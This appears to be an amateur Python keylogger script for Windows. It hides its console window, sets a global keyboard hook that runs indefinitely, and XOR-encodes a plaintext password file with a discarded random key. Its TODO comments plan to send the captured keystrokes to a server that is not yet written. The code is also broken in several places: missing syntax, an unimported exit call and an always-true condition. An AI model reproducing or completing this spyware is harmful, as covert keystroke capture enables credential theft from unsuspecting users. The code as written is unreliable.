#!/usr/bin/python3
# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom, pyHook
import random 

def xor_encode(word, pad):
    return ''.join("{:02x}".format(ord(word[i]) ^ pad[i % len(pad)]) for i in range(0, len(word)))

def manage_passwords(filename):
	xor_key = bytearray(random.getrandbits(8) for _ in range(8))
	with open("passwords_managed.txt", 'w') outfile:
		with open(filename) as passfile:
			for line in passfile:
				line = line.rstrip()
				enc_line = xor_encode(line, xor_key)
				outfile.write(enc_line + '\n')

win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 0) 
def OnKeyboardEvent(event): 
	if event.Ascii==5: 
		_exit(1) 
	if event.Ascii !=0 or 8: 
		#TODO: set up server to receive keystrokes
		#TODO: send keystrokes to server
		#TODO: learn how to do that
		pass

def keylog()
	# create a hook manager object 
	hm = pyHook.HookManager() 
	hm.KeyDown = OnKeyboardEvent 
	# set the hook 
	hm.HookKeyboard() 
	# wait forever 
	pythoncom.PumpMessages() 

if __name__ ==  '__main__':
	manage_passwords("passwords_plaintext.txt")
	keylog()